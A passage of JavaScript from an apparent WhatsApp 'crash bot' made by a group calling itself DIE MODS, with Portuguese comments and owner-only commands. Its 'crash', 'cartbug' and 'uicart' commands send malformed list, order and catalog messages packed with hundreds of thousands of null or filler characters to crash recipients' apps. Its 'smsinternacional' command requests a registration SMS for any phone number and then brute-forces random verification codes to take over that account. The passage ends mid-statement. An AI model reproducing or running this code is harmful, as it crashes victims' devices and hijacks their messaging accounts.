  trix.sendjson(from,{"groupInviteMessage":{"groupJid":"120363148186990133@g.us","inviteCode":"j0VB/1rvRVlwLOnM","inviteExpiration":"1692095912","groupName":"😈 𝐏𝜭⃟𝐢𝐙 ✩ 𝗯𝘆 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 𝗮𝗻𝗱 𝗫𝗗 ✦  🕺","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACcASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAHOJo6PniSVIRgeybWVeZMX8/rKOda/dzw19OdkeamTby4w3wDKgJ5gbjpAWAH//xAAfEAADAQEAAgIDAAAAAAAAAAAAAQIDERIhBEExUWH/2gAIAQEAAT8AnP7F6RTRdSVSKZ0miEmdSRrspL3pjrRrpS0n8s8q/YqYqMG2zT0i02zP49XS8jXCVk0kaSr/AIxYqZbZxcJltnxsuIuOiyXRTw6vs1wim2vQ8F90NQjNeTSSM48UNHBorpdMrrFn1nx8UvYkf//EABcRAAMBAAAAAAAAAAAAAAAAABARIAH/2gAIAQIBAT8AYUYHf//EABoRAQEAAgMAAAAAAAAAAAAAAAEAEBESICH/2gAIAQMBAT8A1eFyITKQNrq4/9k=","caption":"😈 𝐏𝜭⃟𝐢𝐙 ✦ https://t.me/idiemods🤯"}},{quoted: crash})
  await delay(2000)
  trix.sendjson(from, {
  "extendedTextMessage": {
   "text": "😈 ✦ ꪶ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   ⸸ ꫂ ✦ 🕺"
   }},{quoted: cr});break
//By kalzin OwO
case 'crash':
if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
let cu33 = " ~ ~ ~ 🐙 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   TOP CRASH 🐙 ~ ~ ~ ";
for (let i = 0; i < 95000; i++) {
  cu33 += "\u0000\u0000\u0000\u0000\u0000";
}
cu33 += "";
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
  trix.sendjson(from, {
    "listMessage": {
      "title": `[ * * * 𝐑𝚵͢𝚫𝐋 𝐂𝐑𝚫𝐒͢𝐇 * * * ]${cu33}`,
      "description": ` 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞🇩🇪 🦅`,
      "buttonText": cu33,
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST_CATALOG",
            "products": [
              {
                "productId": "4120139628109348"
              }
            ]
          }
        ],
        "headerImage": {
          "productId": "5512997675520",         "jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPgMBIgACEQEDEQH/xAAuAAABBQEAAAAAAAAAAAAAAAAFAAECAwYEAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAANHJnKRXSBujBfIamrk6zlnZyGV1uTW4sJ7QyoyShWTl5Mxr6DNkDvFXcmdBvQOtCsAlgaQygNoNedE0iLpDxSHdI//EACcQAAICAQMDBAIDAAAAAAAAAAECAAMRBBASEyEyBSIxUSNSFDNx/9oACAEBAAE/AF8RMS61KV5NH9W92EqlHqYtcK642xMRfEbeo1Nai4iEdXhZnAlnmOPxntNOHFSczk43XxG1gJQ4mpThqT9mW1/jDCaHUM6BH8t18RvrLhbq3I+BOp+PE0B51EjyQxDyUHYKAo90/wAJlnMqQA3xGpsFpTieWZbTqaly1ZxPSVJLwDA2RAANrFZhhTiV6YK/Nu7RlDAgjIi6Q1MTW2BBnHfZdVebjSKhkCUanqWPUy8XWZA+SJZalS8nbAgZSM5EyPvYEH4M7trn42cfZNK4pttW3+z9vuX2LZVZYgOQexJmrxboqWPc9pdXX/Efpnvxl9iHQ1Hn7xiai1y2mXPsI7mUVlbiVsGCPERUq7NxGYVrY5IBM6dP6Cca+PHiMfUVa1GAABOlT+izjWV48RiKta+IAn//xAAXEQEBAQEAAAAAAAAAAAAAAAABEQAw/9oACAECAQE/ANCW5CCPBeX/xAAbEQEAAgIDAAAAAAAAAAAAAAABABEQICEwQf/aAAgBAwEBPwCAMTN8aUVAv3q//9k=","scansSidecar":"8+Falb5f5QSYWAsuzUMGTGoE6H+YhMRCKX3f0NHqXOf7BIiuMYiVsQ==","scanLengths":[999999999,9999999,99999999,9990],"midQualityFileSha256":"CPwmEYeSZiQlg7HyIgV1HbHLPJ8ymqZhxxFWs5+xWH8="
        },
        "businessOwnerJid": `5583998140301@s.whatsapp.net`,
"listMessage":{"header":{"hasMediaAttachment":true,
        "locationMessage": {
          "degreesLatitude": 1.2348753517826312,
          "degreesLongitude": -31.82241802860517
        }
      }
      }
      }
    },
    
  }, {quoted: cr});
  break;
// ...

case 'kibquoted':
  const kibj9889 = args.join(' ');

  if (kibj9889.includes(' ')) { // Verifica se a mensagem tem múltiplos espaços
    enviar(`\n\n *Nao use multlipos Espaços 😠* Exemplo: ${prefixo + command} (nome da quoted) \n\n`);
  } else if (!isOwner && !info.key.fromMe) {
    enviar("Só meu dono man");
  } else {
    // Restante da lógica
    const pastaQuoteds = './⭐ ~ GERADAS ~ ⭐/QUOTEDS';

    if (!fs.existsSync(pastaQuoteds)) {
      fs.mkdirSync(pastaQuoteds, { recursive: true });
    }

    // Ler o conteudo atual do arquivo 'kib.js'
    const content989 = fs.readFileSync('trix.js').toString().split('\n');

    // Encontra a linha com a ocorr锚ncia de "break"
    const breakIndex98989 = content989.findIndex(line => line.includes('//𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦'));

    // a macumba
    if (breakIndex98989 !== -1) {
      // socrorrr

      const infogetclone666999 = isQuotedMsg ? info.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage : info.message.extendedTextMessage.contextInfo.quotedMessage;
      const contentToAppend999 = `const ${kibj9889} = { 
        key : {
          "fromMe": false,
          "participant": "0@s.whatsapp.net",
          "mentions": true,
          "remoteJid": "556181496039-1625944593@g.us",
          participant : '0@s.whatsapp.net'
        },
        message: ${JSON.stringify(infogetclone666999)}} \n //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦`;

      enviar(`\n\nQuoted criada com sucesso ⭐ ${kibj9889}\n\n`);
      content989.splice(breakIndex98989 + 1, 0, contentToAppend999);

      fs.writeFileSync(`./⭐ ~ GERADAS ~ ⭐/QUOTEDS/${kibj9889}`, ' ');

      // Escreve o conte煤do atualizado no arquivo 'kib.js'
      fs.writeFileSync('trix.js', content989.join('\n'));
    }
  }
  break;  // Encerra o bloco 'case kibquoted'
  
 case 'quoteds':
    if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
    const pluginsPath = './⭐ ~ GERADAS ~ ⭐/QUOTEDS';  // Substitua pelo caminho correto

    const files = fs.readdirSync(pluginsPath);

    let meusplugins = 'SUAS QUOTEDS:\n\n';
    for (const file of files) {
      meusplugins += ' ✔ 𐎟  ' + file + '\n';
    } 

    enviar(meusplugins);
    break;
  case 'cases':
    if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
    const pluginsPath2 = './⭐ ~ GERADAS ~ ⭐/CASES';  // Substitua pelo caminho correto

    const files2 = fs.readdirSync(pluginsPath2);

    let meusplugins7 = '~ ~ ~ SUAS CASES: ~ ~ ~\n\n';
    for (const file2 of files2) {
      meusplugins7 += ' ⭐ 𐎟  ' + prefixo + file2 + '\n';
    } 

    enviar(meusplugins7);
    break    

  case 'kib':
const kibj = args.join(' ');

  if (kibj.includes(' ')) { // Verifica se a mensagem tem múltiplos espaços
    enviar(`\n\n *Nao use multlipos Espaços 😠* Exemplo: ${prefixo + command} (nome da Case) \n\n`);
  } else if (!isOwner && !info.key.fromMe) {
    enviar("Só meu dono man");
  } else {
      // by kalzinpfvr trix nao tira isso 
    // Verifica se o arquivo 'kib.js' existe no diretório atual by kalzin
const pastaCases = './⭐ ~ GERADAS ~ ⭐/CASES';

if (!fs.existsSync(pastaCases)) {
  fs.mkdirSync(pastaCases, { recursive: true });
}


    // Lê o conteúdo atual do arquivo 'kib.js'
    const content = fs.readFileSync('trix.js').toString().split('\n');

    // Encontra a linha com a ocorrência de "break"
    const breakIndex = content.findIndex(line => line.includes('break'));

    // Verifica se a ocorrência de "break" foi encontrada
    if (breakIndex !== -1) {
      // Código que será adicionado ao arquivo 'kib.js' após a linha do "break"
   macaco = `'` 
      const infogetclone666 = isQuotedMsg ? info.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage : info.message.extendedTextMessage.contextInfo.quotedMessage;
      const contentToAppend = `case ${macaco}${kibj}${macaco}: if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n");trix.sendjson(from, ${JSON.stringify(infogetclone666)});break\n`;
      enviar(`\n\nCase criada com sucesso ⭐ ${prefixo}${kibj}\n\n`)

      // Insere a nova string após o "break"
      content.splice(breakIndex + 1, 0, contentToAppend);

      // Escreve o conteúdo atualizado no arquivo 'kib.js'
      fs.writeFileSync('trix.js', content.join('\n'));

      // Cria o diretório, se ele não existir
      const outputDir = path.join(__dirname, '⭐ ~ GERADAS ~ ⭐', 'CASES');
      if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, { recursive: true });
      }

      // Escreve o arquivo no diretório
      fs.writeFileSync(path.join(outputDir, `${kibj}`), ' ');

    } else {
      console.error('Palavra "break" não encontrada no arquivo.');
    }}
    break;
  case 'limpar':
 enviar(`\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`)
  break
  case 'uicart':
if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
  trix.sendjson(from, {
    "listMessage": {
      "title": `base `,
      "description": ` base`,
      "buttonText": "𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST_CATALOG",
            "products": [
              {
                "productId": "4120139628109348"
              },
              {
                    "productId": "7584104564934820"
                  },
                  {
                    "productId": "7584104564934820"
                  },
                  {
                    "productId": "7584104564934820"
                  },
            ]
          }
        ],
        "headerImage": {
          "productId": "5512997675520",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAMgAyAMBIgACEQEDEQH/xAAcAAEAAQUBAQAAAAAAAAAAAAAABQIDBAYHAQj/xAA+EAABAwMCAwYFAgIHCQAAAAABAAIDBAUREiEGMUEHEyJRYXEUMoGRoRWxQlIII3KCwdHwFjM0VGKSk6Ky/8QAGQEBAQEBAQEAAAAAAAAAAAAAAAECBAMF/8QAIhEBAQACAgIBBQEAAAAAAAAAAAECEQMxEiEiBBMUQXFR/9oADAMBAAIRAxEAPwDh6Ii6XkIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiIPQ1zg4taSGjLiByGcb/AFIXoLdDgW5ccYOeSpUzwpwzdeKbm2is1HJUSZHeOAw2NpOMudyAUtkm6sQyLtfbR2bWbh6tmu4v8VG2tc6VlA+Eue5+cuEen+HJ64AzzXIKKtNHO4N/raVxAkie0Ykb6jfBxncbjoVjj5ceTHyxWzTDRZl5ov028V1CH94Kad8IfjGrS4jP4WGvRkREQEREBERAREQEREBERAREQERZzLXUfCtqZ9FPTu+V8zg0v9Wt+Zw9QCE3pWCpW08PXS6x97SUjvhgcOqZXCKFv9qRxDR91l0t3tlrghNutTKivbkvqq8iVgPTRD8o/v6/oo663i43eRr7lWTVGgYY17vDGPJreTR6AALO7ehKstNhohJ+rXwzzN2ENsgMoJ8jI8taPdupWTdLLTvjNDYe90h2o19U6XXnltGI8YUCieP+0X2wOfRy1I+VkjGEf2g4j/5K9ZW1TGtbHUzMaw5a1ryA0+YA5Ku3TRRvkiqtfw8zdDyzmw82uA64IG3UZG2cq+bJXvy6jgdXRZ2kpAZR9QN2+zgD6K/0S3GHE8/Etp4f+PmkmrqGCSmlkkdlzwH5a4n+yQM9dJUDa6X4utZG86YW+OV+caIxu4/b7nAG5CyP0iWE5uUjKFuCS2U5k9hGPFk9M4HqFRV1sYgNLb43xUxwZHPOXzEdXY2AzuGjl1JIys4ySaxP6s3SsfcbnV1soDZKmZ8zgOQLnEkD7rGRFtBERAREQEREBERAREQEREBERBVE8xvD241DlkA/gr2eWSomfLPI+SV5y57zkk+pVCIr3PhI2xz5LxERBFk22lNbXw04/jdufIdfwq7xCKe6VMTG6WtedI8h0U8pvxGGiIqCIiAiIgIiICIiAiIgIiICIiAiIgIgRB6WkNDtsEkcxn7LxERRVMY6R7WRtc97iA1rRkknoFSuldgNijvHHbKiobqht0ZqQOhfkBufYnP91Zzy8cbRs9B2Xv4b4T/V7lMBXNiMs8TItRibjOnJIGwG/wBea4xc6r42vnqAC0PdkAncDovrTtlrfgezW9yAAukiEIyP53Bp/BK+QVz/AE3ytzvYIiLqQREQEREBERAREQEREBERAREQEREBeua5hw4Fp54IwvF697nu1PcXHGMk55IrxEVcMT55o4oml8kjg1rRzJJwAgmOE+F7rxVchRWenMjhgySO2ZEPNx6fuei+nezDs9peB6WZ/wAS+quNS0Nml+VgAJIDW+W/M/jkoy111p7M+CnULGGWtp4nSTOaNpp8DIzzwDgegAWt9jL7vxDxpWX+uq56umbC5hmkAADjjSwAHAwC44HLbzXDycl5JdepB1HjzhpnFvDNTaH1L6XvS1wka3VgtORkdRt6L5a4v7P7/wAMXEU1TRyVMTye5qKdhe2QfTcH0K+ouO+LKThC0x1tXpcZZRExjnEZOCTyBPIHp5KUsN2pr3a4a6ieHRSDOxzg+X+PsQV58fLnxzevQ+Rrf2e8W3AA09grwDyM0fdD/wB8Kq98AXyyRA3CKFk5bqMDZNTwOnLbfB69CvovtB7TLPweXUz9VbdMZFLEcafLW7+H8n0XBbx2izXq6S1lfRhhfgBsT9mgdMH6/de/3ebKbxg0IggkEYI5gope+1NvrXmopBLHO4+NjmjDvXnzUQunG7m7EERFoEREBERAREQEREBERAREQFkW+GnnrYYqypFJTucA+YsL9A89I3Kx0QdV7brFwzZ4eH32GufNVS0MWWNYCySENw2Yu6Odjljp06864drY7bxBba6dhfFTVMcz2jmQ1wJ/ZY1XWVFZ3HxUzpe4iEMer+Fg5NHpuVYWMMLjj427W3dfRV8tdddi+52uD9Ut0rxVR6TkTRF2p7QejsZHQ59l0qw13DtJb6GmtNXQw084DqeITNDn6t+ROST16r5j7OO0W5cFzGJjRV2uR2qSme7GD1cw9D+CvpKgsfDd8txqncP0sXx8QklEtI1khDt93Ac985B5rg5OP7fq9Dn39Ifh27XQW+voWvmoqZjhKxvJh3JecnHL9vbMp2JXSKj4YgtdSWRzeOQO5ajk5H0AH2U1xFwpYqS2udeL3XwW8YaI624udDrxsSHnxHbOknG2wXKb3xNYrNRVtJZK193u9Ux8MT6eDuoINe22fmIBOMDCs3njMJ0OTSmWurnuGuWaZ5O+5cSVduFrq6BrXVMWljjgOBBGfotptloZa7fLNKQaxzCAR/CSNg31XnGEkYs0LWcnvbpHoAV7/kbzmOPSNKRVwSmGeOVrWOdG4ODXtDmnBzgg7EeiqcTUTyyPdGxztTztpGeeAANvQcl1KtIiIgiIgIiICIiAiIgIiICIiAtg4J4XqOLbw63UlTTU0ohfKH1Dw1pLRkN8zn0zgZPRa+q4ZZIZBJC90cg5OacEfVS716WKqqE01TLCXxyGNxaXxu1NODzB6j1VtxLnEuJJO5J6rxZtntdbebhFQ2ymkqaqX5Y2Df1J8gPMq9DcOx7ghnGfEEorXPbbKNokn07F5J8LM9M4O/kF9X0VLBQ0kNLSRMhp4WBkcbBgNaOQC0Dsa4WunCvBtVT1sNPFcqiodMAXh406WhocW+zuXmtj4aslfQ3i83O7V4qZ657BHEzV3cETAcNaD55JK+bz5+eV9+oL/GXDlHxVYKm1148Eg1RyDnFIPlcPb9shfLdlsUtpv1ypLgGtrqJ/clo3x5uGehGMH1X0twVbr1ZaP9NuT46mmillMVSZS95jLyWNORnIHv0C1PtV4Lq628Mv1joTV1pg7mSJr2szjk7cjO230CzjnZLhvscRvXEAgqZIYoHOezbMnhAPtzK1esq56yXXUPLiNgOQA8gFdvDqt1ynFxjfFVNdpfG9paWEdMHksNd/FxTCT17RWIZDA6cRuMLXBhfjYOIJAz54B+yoW5ycbg9nDOGBaaASGoMj6kQgOLQBpORzkzqBd5YHUrTFvG29xRERaQREQEREBERAREQEREBERBUxjn/I1zvYZXmh2QNLsnltzVyGpng2hmkjGc+FxG6zG3q4Nj0Q1BgGdRMIEZPuW4U9q9dZK9kbXzxx04f8onlZGT9HEFT1h4Su5kjmjqm0sczC1z4J/G6M8/lO4PuoilvdU5joq6suD2k6muZNhw28zvjClv8AagRyNd8PPNK2MNEjzEXBuPPus/deeVz6g6nwbxBxBwlY/wBLbQx3cNkLo6iavc3S3ADWhpYcAY5A4W12jtPpIohFxXTvtdXgkPja6aCTyDXNBOr0IXKOHOK/1SQUlFQNa9jQTqeQPU+FpA/HNbczLmtMjWh/PAOQD7rjzmr8orY4e1aFtVPJWWO6RWvbuKhsYc8jG5fHnLR5HfbyWo8Y9o/EtztddS2uyVdHFM4OpayCYsmYwOz4mjO5AwRkYysmUyE4hfGHDchwz/itGu3EYnvvwTqkCliy17YA4l7xz32wPvyVwk7k6GlTWm81Er5pqKulkcSXPfG4lx6kk81HwQTVEminhklfz0saXH8LoVAypr/iG2ttTSNDsuk+K3IByDgk6c4HIKEunEWJ300lPIzu3ESOgmELnu6k6Bg/ldWHJcuommsyU08biJIZWEcw5hGFbLSOYI6bhS9RdJ6mMwURq2sPieZZzI52OmcAAemN1GVM00z9U7nFwwNxjG3kvWb/AGLSIiqCIiAiIgIiICIiAiIgL1oBcATgZ3PkvEQe5OMZ2yrrHNgkhlaWSOBDnMc3bY8j5qRq3WiOhpo4Iql9SR3kry9uMkbNG3+s9Vhtmpu7091oI66dRPucj9lN7/Sq7jLJVP8AjJamnfLJgOZE3QW7eWAOWyot9NUV1Q5kT8HQS95OwaPP8D7KiOCSokLYqeRz8Z0saT+FufZxRwTfqNNVOZ3s0bS1jXeNrQ459t9Oyxnl4Y2wZPA9DR0dziIikfUEENm1kY23GkbY98roWQtRus0PCZo5o4DO2eXu5HuO7G+nr/ktknpIZpg6SmilDvmc/cjbbAI/yXDd33krE4hrG01MI3uDRNlpdrLTj0IBXMrjRw00zXQmhhYSe7e10rSR1BzkZ3W/XmtopbvR2KSGSWWRudbXf7sYOOfM7KO4q4cpKfh2d7e8kkje17S54b104yRgDf8AC3x242S9UYfBdTVQud3dTTSwvd3eH1BDdZ3GBoyTgeam79wjS3p0U8rvhqoDD3QjIcPr+60C2/EUjXGguDaJ5O7JKmNzXeux5/T6rLnvnEjXkishl/6ojE4H7L2vHlMt43Q2em4OqrYHSWi7GKXHJ8DcP9CRvhc8qJa23tqrdPH3Ot2ZI3t3z05/gqZHEXEUcf8AxLi9x8IYI3H1y0AlQ11rbhc5TNX65HxDSXd2G6R5HA/denHjlL8kR6KprnRSAjGpp6gFUr1QREQEREBERAREQEREBERBdjp5pACyJ5aeuk4WZ8MyZjTI34YxtDCGMe90h38W+w+4WDCZNYbCX6zyDTusomuHOaQEdDNv9sqVRlLC+ZsUTqt8rzhrRAMk+g1LfuFeFKymfT1r6+eDG/cmPS72cMkfRRVgnmo4WmaqqDM458TshntnOFsPEPEM9HaGR0eua4Y8T4QHCP1dsefl+y5cuS53xxVN3G62mKqbQV88Heuw7u5Bkemeg+qkO/hxnvY8cs6guFy3SrlmfJLI0SyE65GxNa8557gArKo5KUS93SGvc548QBb4vdoByEv0/rsdd7y1C6Nf3lJ+oSDQ06m944eXmtY7S47jUQQw0rHPpR4nsjje5znepAxgeWcrVY/gQWvZFEJo3AiUVYie0j0LANvZdApOKKWotr5A+IVbGEmNr9Yz0JIHL3ws3C8dlnscmbb6nGZYnQMHN8o0gffn7DdZEUVGyEl8bpMnwzPd3bftuXD2wVsd1qZKyV07ZoI5XDxs1aopD0cW77j0G/7wbrgyNxM1S6eYbf1VOxg/7iM/hdGOdzm0Y7quNuIo5XRRcnCBmkO9yTqP1VqpNC2R7YW1EgBwJDKMH1xpysxt6ZlrZqd1RDnJbM9pI9WkNBB+49F0CHg201cdPUPbO1jg2TucMbzGcEhoP5TLOYdnblADc+IuA9srwjBIyDjyUhxCcXqsjEYijikMbIxya0HAA/11UcvWXcQREQEREBERAREQEREBERAV6keyKpjfKCWtOcBWUSzc0qSrLrJJlsAMbfPqf8lHh7w/WHOD/wCbO6pRZxwmE1Bf+Mqv+Zm/8hXj6qoe0tfPK5p5gvJBVlFrQK9S1M1LKZIHuY4gtODzB6FWUSzYlxd2vic2SE5IwcHYqMdKXDxta44xqPP/AF7q2ixjx44dC7TTvppmyxae8bu0uaHYPng7LK/WLgZjK6smfIdtT3F2PbPL6LARa1KJC5V7bixstRHiuBw+VuwkbjmR/N69VHoismgRERBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREH//Z",
"itemCount": 1,
            "status": "INQUIRY",
            "surface": "CATALOG",
            "message": "",
            "orderTitle": "Scrr",
            "sellerJid": "558398042937@s.whatsapp.net",
            "token": "AR5jP2dKxVH4t7wKG7URtrClL3JkMWuX3cI3Pu7vRV0Mqw==",
            "totalAmount1000": "99999000",
            "totalCurrencyCode": "BRL"       
},
        "businessOwnerJid": `5583998140301@s.whatsapp.net`,
        },
     "footerText": " ✰ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 ࢤ ✦",
"listMessage":{"header":{"hasMediaAttachment":true,
        "locationMessage": {
          "degreesLatitude": 1.2348753517826312,
          "degreesLongitude": -31.82241802860517
      }
      }
      }
    },
    
  }, {quoted: menuquoted});
  break;//teste
case 'testeoi': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"imageMessage":{"url":"https://mmg.whatsapp.net/v/t62.7118-24/35300100_1202197697123293_1841665872986373893_n.enc?ccb=11-4&oh=01_AdScdgOujDsIgD2VKxq6eHh16RAXm_cC4F8Wl10a8Pex8A&oe=64F61E84&mms3=true","mimetype":"image/jpeg","caption":"Pq ela entrou dentro","fileSha256":"zH7qR9kbAjAzrMz4WsJ/zh7s00zPQ8H2HL3r5wwNZCk=","fileLength":"97622","height":1280,"width":609,"mediaKey":"EwjTa7+UfHAuDsF3zNBsPg3Awd2/uDgCnyAUi8eETiE=","fileEncSha256":"JviMn3HlXgNy9TXZL58x4wyRYxnKFPmq1Sah59bgfwY=","directPath":"/v/t62.7118-24/35300100_1202197697123293_1841665872986373893_n.enc?ccb=11-4&oh=01_AdScdgOujDsIgD2VKxq6eHh16RAXm_cC4F8Wl10a8Pex8A&oe=64F61E84","mediaKeyTimestamp":"1691267019","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIgMBIgACEQEDEQH/xAAtAAEAAwEBAQAAAAAAAAAAAAAAAQIDBgQFAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAA+THSUs56emucs7JLDZZjO0Gol89dUmVr3LC3G1aG846lgVBEhIP/xAAkEAABAwMDBQEBAAAAAAAAAAABAAIRAxIhECIxBAUVUWFBUv/aAAgBAQABPwAlRhQpiQrlV6CgBspJvb6Z5ppnbaQ5orx1Cc0V4jov4VR72HATXVyJhX9T6V9cRjUGTgoipiHICrdN2NHwMkIWxEGUKgaAACSVcC47TIQyF8kJsZgqGh/0oaG0QTyruMBZ9CUJ/Y0JFuQrm5A5CY4YLitqjSB6W05hBylf/8QAGBEBAAMBAAAAAAAAAAAAAAAAEQAQYTD/2gAIAQIBAT8AIU5HOf8A/8QAGBEBAAMBAAAAAAAAAAAAAAAAEQAQYTD/2gAIAQMBAT8AY0bDbOH/2Q==","scansSidecar":"AHcZln8IFiwUI6eiWTbqFnAJrqNfSx6lyjXERkqJ0pku66nBiXbi5A==","scanLengths":[6440,48766,18825,23591],"midQualityFileSha256":"RYpRKhnBPEQO8J3/L0aGI03g4SjS+8OSvZujlBCXutQ="}});break

  
  








  



case 'smsinternacional': {
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
  
  if (args.length < 1) return enviar(`\n\nExemplo: ${prefixo + command} (ddi exemplo +55)|(numero com ddd sem o ddi) \n\n`);
  
  const argsSeparated = args[0].split('|');
  if (argsSeparated.length !== 2) return enviar("\n\nFormato inválido. Use o formato: ddi|número\n\n");
  
  const ddi = argsSeparated[0];
  const numero = argsSeparated[1];
  
  const numi = numero.replace('@s.whatsapp.net', '');
  
  try {
    const { state2, saveCreds2 } = await useMultiFileAuthState('./kalzinplug/pluglin');
    
    const cu1 = await trix.requestRegistrationCode({
      phoneNumber: '+' + ddi + `${numi}`,
      phoneNumberCountryCode: ddi,
      phoneNumberNationalNumber: `${numi}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
    
    enviar("SMS Solicitado pedirei novamente em: " + cu1.retry_after + " Segundos");
  } catch (err) {
    // Lógica de tratamento de erro, se necessário
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var euamotraveco = Math.floor(Math.random() * 999);
      var euamotraveco2 = Math.floor(Math.random() * 999);
      await trix.register(`${euamotraveco}-${euamotraveco2}`);
    } catch (err) {
      console.log(`${euamotraveco}-${euamotraveco2}`);
    }
  }
}
break;

case 'cartbug':
    if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
let cu36 = "ᯭ ᯮ 𝐍𝟄𝝌⌰𝑺 Op 🐲 𝐛𝐲 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 👾 ";
for (let i = 0; i < 5000; i++) {
  cu36 += "\u2222";
}
cu36 += "";
  await trix.sendjson(from, {
    orderMessage: {
      itemCount: -1, // Cambié el valor negativo a 1, ya que no puede haber un número negativo de artículos
